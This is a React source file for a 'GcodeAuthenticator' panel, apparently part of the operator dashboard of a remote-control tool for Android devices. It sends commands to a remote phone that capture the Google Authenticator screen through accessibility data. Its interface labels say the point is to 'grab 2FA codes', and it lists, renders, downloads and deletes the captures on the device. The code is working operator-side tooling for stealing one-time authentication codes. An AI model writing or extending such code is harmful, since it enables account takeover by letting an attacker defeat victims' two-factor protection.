import React, { useState, useCallback, useEffect, useRef } from 'react';

const PHONE_W = 320;
const PHONE_H = 680;

function formatTime(ts) {
  if (!ts) return '';
  return new Date(ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
}

function formatDate(ts) {
  if (!ts) return '';
  const d = new Date(ts);
  const today = new Date();
  if (d.toDateString() === today.toDateString()) return 'Today';
  const yesterday = new Date(today);
  yesterday.setDate(today.getDate() - 1);
  if (d.toDateString() === yesterday.toDateString()) return 'Yesterday';
  return d.toLocaleDateString([], { month: 'short', day: 'numeric' });
}

function renderFrameElements(screenData, devW, devH) {
  if (!screenData) return null;
  const elements = (screenData.elements || []).filter(
    el => el.text || el.contentDescription || el.hintText || el.clickable || el.editable
  );
  const scX = PHONE_W / devW;
  const scY = PHONE_H / devH;

  const getStyle = (el) => {
    if (el.editable)  return { border: '1.5px solid #3b82f6', background: 'rgba(59,130,246,0.12)' };
    if (el.clickable) return { border: '1px solid rgba(34,197,94,0.5)', background: 'rgba(34,197,94,0.07)' };
    if (el.selected || el.checked) return { border: '1px solid rgba(234,179,8,0.5)', background: 'rgba(234,179,8,0.07)' };
    if (el.text || el.contentDescription) return { border: '1px solid rgba(148,163,184,0.16)', background: 'transparent' };
    return { border: '1px dashed rgba(100,116,139,0.12)', background: 'transparent' };
  };

  return [...elements]
    .filter(el => el.bounds)
    .sort((a, b) => {
      const aA = (a.bounds.right - a.bounds.left) * (a.bounds.bottom - a.bounds.top);
      const aB = (b.bounds.right - b.bounds.left) * (b.bounds.bottom - b.bounds.top);
      return aB - aA;
    })
    .map((el, i) => {
      const left   = el.bounds.left * scX;
      const top    = el.bounds.top  * scY + 20;
      const width  = (el.bounds.right  - el.bounds.left) * scX;
      const height = (el.bounds.bottom - el.bounds.top)  * scY;
      if (width < 2 || height < 2) return null;
      const label = (el.text || el.contentDescription || el.hintText || '').slice(0, 32);
      return (
        <div
          key={i}
          style={{
            position: 'absolute', left, top, width, height,
            ...getStyle(el),
            borderRadius: 3, boxSizing: 'border-box', overflow: 'hidden',
            display: 'flex', alignItems: 'center', padding: '0 2px',
          }}
        >
          {height > 10 && label && (
            <span style={{
              fontSize: Math.min(Math.max(height * 0.36, 6.5), 9.5),
              color: el.editable ? '#93c5fd' : el.clickable ? '#86efac' : '#cbd5e1',
              whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis',
              lineHeight: 1.2, pointerEvents: 'none',
              fontWeight: el.clickable ? 600 : 400,
            }}>
              {label}
            </span>
          )}
        </div>
      );
    });
}

export default function GcodeAuthenticator({ device, sendCommand, results, screenReaderPushData, gcodeVersion }) {
  const deviceId = device?.deviceId;
  const isOnline = device?.isOnline;
  const info     = device?.deviceInfo || {};
  const devW     = info.screenWidth  || 1080;
  const devH     = info.screenHeight || 2340;

  // ── Screenshot list state ────────────────────────────────────────────────
  const [screenshots, setScreenshots]         = useState([]);
  const [loadingList, setLoadingList]         = useState(false);
  const [lastFetched, setLastFetched]         = useState(null);
  const [loadingFile, setLoadingFile]         = useState({});
  const [capturing, setCapturing]             = useState(false);
  const seenResultIds = useRef(new Set());

  // ── Current screenshot view ─────────────────────────────────────────────
  const [currentScreenshot, setCurrentScreenshot] = useState(null);
  const [viewMode, setViewMode]                   = useState('list'); // 'list' | 'view'

  // ── Fetch screenshots list ──────────────────────────────────────────────
  const fetchScreenshots = useCallback(() => {
    if (!deviceId) return;
    setLoadingList(true);
    setLastFetched(Date.now());
    sendCommand(deviceId, 'list_gcode_screenshots', {});
    setTimeout(() => setLoadingList(false), 5000);
  }, [deviceId, sendCommand]);

  // Auto-refresh when gcodeVersion changes (new screenshot captured)
  // This also runs on initial mount since gcodeVersion starts at 0
  useEffect(() => {
    fetchScreenshots();
  }, [gcodeVersion]);

  // Refresh when a new screenshot is captured (device signals via offlineRecordingVersion trick or separate event)
  // For now, we'll just refetch when user clicks refresh or after capture completes

  useEffect(() => {
    if (!results) return;
    const relevant = results.filter(r =>
      (r.command === 'list_gcode_screenshots' || r.command === 'get_gcode_screenshot') &&
      r.success && r.response
    );
    relevant.forEach(r => {
      if (seenResultIds.current.has(r.id || r.commandId)) return;
      seenResultIds.current.add(r.id || r.commandId);

      try {
        const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;

        if (r.command === 'list_gcode_screenshots' && Array.isArray(data.screenshots)) {
          setScreenshots(data.screenshots);
          setLoadingList(false);
          setLastFetched(Date.now());
        }

        if (r.command === 'get_gcode_screenshot' && data.screenshot) {
          setCurrentScreenshot(data.screenshot);
          setViewMode('view');
          setLoadingFile(prev => { const n = {...prev}; delete n[data.screenshot.filename]; return n; });
        }
      } catch (_) {}
    });
  }, [results, deviceId]);

  // ── Capture new screenshot ──────────────────────────────────────────────
  const captureScreenshot = useCallback(() => {
    if (!isOnline || !deviceId || capturing) return;
    setCapturing(true);
    // The command is async; after a while the device will save and send push event
    // which will trigger auto-refresh via gcodeVersion prop.
    // Set a timeout to re-enable button in case push event is missed.
    setTimeout(() => setCapturing(false), 15000);
    sendCommand(deviceId, 'g_authenticatorHelper', {});
  }, [isOnline, deviceId, capturing, sendCommand]);

  // ── View screenshot ─────────────────────────────────────────────────────
  const viewScreenshot = useCallback((filename) => {
    if (!deviceId) return;
    setLoadingFile(prev => ({ ...prev, [filename]: true }));
    sendCommand(deviceId, 'get_gcode_screenshot', { filename });
  }, [deviceId, sendCommand]);

  // ── Download screenshot ─────────────────────────────────────────────────
  const downloadScreenshot = useCallback((screenshot) => {
    if (!screenshot) return;
    const blob = new Blob([JSON.stringify(screenshot, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = screenshot.filename || `gcode_${screenshot.timestamp || Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
  }, []);

  // ── Delete screenshot ────────────────────────────────────────────────────
  const deleteScreenshot = useCallback((filename) => {
    if (!filename || !deviceId || !isOnline) return;
    if (window.confirm(`Delete screenshot "${filename}"?`)) {
      sendCommand(deviceId, 'delete_gcode_screenshot', { filename });
      setScreenshots(prev => prev.filter(s => s.filename !== filename));
      if (currentScreenshot?.filename === filename) {
        setCurrentScreenshot(null);
        setViewMode('list');
      }
    }
  }, [deviceId, isOnline, sendCommand, currentScreenshot]);

  // ── Render helpers ───────────────────────────────────────────────────────
  const Btn = ({ label, onClick, bg, disabled = false, small = false, title = '' }) => (
    <button
      onClick={onClick}
      disabled={disabled}
      title={title}
      style={{
        border: 'none', borderRadius: 6,
        padding: small ? '4px 9px' : '6px 14px',
        background: disabled ? '#1e293b' : bg,
        color: disabled ? '#475569' : '#f1f5f9',
        cursor: disabled ? 'not-allowed' : 'pointer',
        fontSize: small ? 10 : 11, fontWeight: 600, whiteSpace: 'nowrap',
        transition: 'opacity 0.15s',
      }}
    >
      {label}
    </button>
  );

  const STREAM_W = PHONE_W;
  const devH_scaled = devW && devH ? Math.min(PHONE_H, Math.round(STREAM_W * devH / devW)) : PHONE_H;

  return (
    <div style={{ display: 'flex', gap: 16, alignItems: 'flex-start', flexWrap: 'wrap' }}>

      {/* ── LEFT: Phone viewer + controls ── */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>

        {/* Phone frame */}
        <div style={{
          background: '#1e293b', borderRadius: 28, padding: '16px 10px 12px',
          border: currentScreenshot ? '2px solid #7c3aed' : '2px solid #334155',
          display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8,
          boxShadow: currentScreenshot ? '0 0 20px rgba(124,58,237,0.2)' : '0 4px 20px rgba(0,0,0,0.4)',
        }}>
          <div style={{ width: 56, height: 5, background: '#334155', borderRadius: 4, marginBottom: 2 }} />

          {/* Screen area */}
          <div style={{
            width: PHONE_W, height: PHONE_H,
            background: currentScreenshot ? '#101828' : '#0a0f1e',
            borderRadius: 8, border: '1px solid #1e293b',
            overflow: 'hidden', position: 'relative',
          }}>
            {!currentScreenshot && (
              <div style={{
                display: 'flex', flexDirection: 'column', alignItems: 'center',
                justifyContent: 'center', height: '100%', gap: 10,
              }}>
                <div style={{ fontSize: 38, opacity: 0.3 }}>🔐</div>
                <div style={{ fontSize: 11, color: '#334155', textAlign: 'center', lineHeight: 1.7, padding: '0 20px' }}>
                  {viewMode === 'list' 
                    ? 'Capture Google Authenticator screen\nClick "Capture" to grab 2FA codes'
                    : 'Select a screenshot to view'}
                </div>
              </div>
            )}

            {currentScreenshot && currentScreenshot.screen && (
              <>
                {/* Status bar overlay */}
                <div style={{
                  position: 'absolute', top: 0, left: 0, right: 0, height: 20,
                  background: 'rgba(0,0,0,0.85)', display: 'flex', alignItems: 'center',
                  padding: '0 8px', zIndex: 50, gap: 6,
                }}>
                  <div style={{
                    width: 5, height: 5, borderRadius: '50%',
                    background: '#a78bfa',
                    flexShrink: 0,
                  }} />
                  <span style={{ fontSize: 8, color: '#94a3b8', flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                    {currentScreenshot.screen.packageName || 'Unknown app'}
                  </span>
                  {currentScreenshot.screen.elementCount != null && (
                    <span style={{ fontSize: 7, color: '#475569' }}>{currentScreenshot.screen.elementCount} nodes</span>
                  )}
                </div>

                {renderFrameElements(currentScreenshot.screen, devW, devH)}
              </>
            )}
          </div>

          <div style={{ width: 60, height: 4, background: '#334155', borderRadius: 4, marginTop: 2 }} />
        </div>

        {/* Capture button */}
        <Btn
          label={capturing ? "⏳ Capturing…" : "📸 Capture Authenticator"}
          onClick={captureScreenshot}
          bg="#7c3aed"
          disabled={!isOnline || capturing}
          title={!isOnline ? 'Device must be online' : 'Open Google Authenticator and capture screen'}
        />
      </div>

      {/* ── RIGHT: Screenshots list ── */}
      <div style={{ flex: 1, minWidth: 250, display: 'flex', flexDirection: 'column', gap: 8 }}>

        {/* Header */}
        <div style={{
          display: 'flex', alignItems: 'center', gap: 10,
          background: '#0f172a', borderRadius: 10, padding: '10px 14px',
          border: '1px solid #1e293b',
        }}>
          <div style={{ flex: 1 }}>
            <div style={{ fontSize: 12, fontWeight: 700, color: '#e2e8f0' }}>Gcode Authenticator Screenshots</div>
            <div style={{ fontSize: 9, color: '#475569', marginTop: 1 }}>
              {screenshots.length > 0
                ? `${screenshots.length} screenshot${screenshots.length !== 1 ? 's' : ''} saved`
                : 'No screenshots yet'}
              {lastFetched ? ` · synced ${formatTime(lastFetched)}` : ''}
            </div>
          </div>
          <button
            onClick={fetchScreenshots}
            disabled={loadingList || !isOnline}
            title={!isOnline ? 'Device must be online' : 'Refresh list'}
            style={{
              border: '1px solid #334155', borderRadius: 8, padding: '6px 14px',
              background: '#0f172a',
              color: loadingList ? '#475569' : '#94a3b8',
              cursor: (loadingList || !isOnline) ? 'not-allowed' : 'pointer',
              fontSize: 11, fontWeight: 600, display: 'flex', alignItems: 'center', gap: 6,
            }}
          >
            <span style={{ display: 'inline-block', animation: loadingList ? 'spin 0.8s linear infinite' : 'none', fontSize: 13 }}>↻</span>
            {loadingList ? 'Loading…' : 'Refresh'}
          </button>
        </div>

        {/* Screenshots list */}
        {screenshots.length === 0 && !loadingList && (
          <div style={{
            background: '#0f172a', borderRadius: 12, border: '1px dashed #1e293b',
            padding: '36px 20px', textAlign: 'center',
            display: 'flex', flexDirection: 'column', gap: 8, alignItems: 'center',
          }}>
            <div style={{ fontSize: 36, opacity: 0.35 }}>🔐</div>
            <div style={{ fontSize: 13, color: '#64748b', fontWeight: 600 }}>No screenshots captured</div>
            <div style={{ fontSize: 11, color: '#334155', lineHeight: 1.7 }}>
              Click "Capture Authenticator" to take a screenshot of your Google Authenticator 2FA codes.
            </div>
          </div>
        )}

        {loadingList && screenshots.length === 0 && (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
            {[1, 2, 3].map(i => (
              <div key={i} style={{
                background: '#0f172a', borderRadius: 10, border: '1px solid #1e293b',
                height: 52, opacity: 0.5, animation: 'shimmer 1.4s ease-in-out infinite',
              }} />
            ))}
          </div>
        )}

        {screenshots.length > 0 && (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
            <div style={{ fontSize: 10, color: '#475569', paddingLeft: 4, marginBottom: 2 }}>
              {screenshots.length} screenshot{screenshots.length !== 1 ? 's' : ''} saved — click "View" to inspect
            </div>
            {screenshots.map(sc => {
              const isLoaded = currentScreenshot?.filename === sc.filename;
              const isLoading = loadingFile[sc.filename];
              return (
                <div
                  key={sc.filename}
                  style={{
                    background: '#0f172a', borderRadius: 10,
                    border: `1px solid ${isLoaded ? '#7c3aed' : '#1e293b'}`,
                    padding: '10px 14px',
                    display: 'flex', alignItems: 'center', gap: 10,
                  }}
                >
                  <span style={{ fontSize: 16, flexShrink: 0 }}>🔐</span>
                  <span style={{
                    flex: 1, fontSize: 11, color: isLoaded ? '#c4b5fd' : '#94a3b8',
                    overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap',
                    fontWeight: isLoaded ? 600 : 400,
                  }}>
                    {sc.filename}
                  </span>
                  <span style={{ fontSize: 9, color: '#64748b' }}>
                    {formatDate(sc.timestamp || sc.lastModified)} {formatTime(sc.timestamp || sc.lastModified)}
                  </span>
                  <button
                    onClick={() => viewScreenshot(sc.filename)}
                    disabled={isLoading}
                    style={{
                      border: 'none', borderRadius: 6, padding: '4px 10px',
                      background: isLoaded ? '#4c1d95' : (isLoading ? '#1e293b' : '#1e3a5f'),
                      color: isLoading ? '#475569' : '#e2e8f0',
                      cursor: isLoading ? 'not-allowed' : 'pointer',
                      fontSize: 10, fontWeight: 700, whiteSpace: 'nowrap', flexShrink: 0,
                    }}
                  >
                    {isLoading ? '⏳ Loading…' : isLoaded ? '↻ Refresh' : 'View'}
                  </button>
                  <button
                    onClick={() => downloadScreenshot(sc)}
                    disabled={isLoading}
                    style={{ ...smallBtnStyle('#166534'), fontSize: 10 }}
                    title="Download as JSON"
                  >
                    ⬇ Save
                  </button>
                  <button
                    onClick={() => deleteScreenshot(sc.filename)}
                    disabled={!isOnline}
                    style={{ ...smallBtnStyle('#7f1d1d'), fontSize: 10 }}
                    title="Delete from device"
                  >
                    🗑
                  </button>
                </div>
              );
            })}
          </div>
        )}
      </div>

      <style>{`
        @keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
        @keyframes shimmer { 0%,100%{opacity:0.5} 50%{opacity:0.25} }
      `}</style>
    </div>
  );
}

function smallBtnStyle(bg) {
  return {
    border: 'none', borderRadius: 6, padding: '4px 9px',
    cursor: 'pointer', fontWeight: 600, fontSize: 11,
    background: bg, color: '#f1f5f9', whiteSpace: 'nowrap',
  };
}
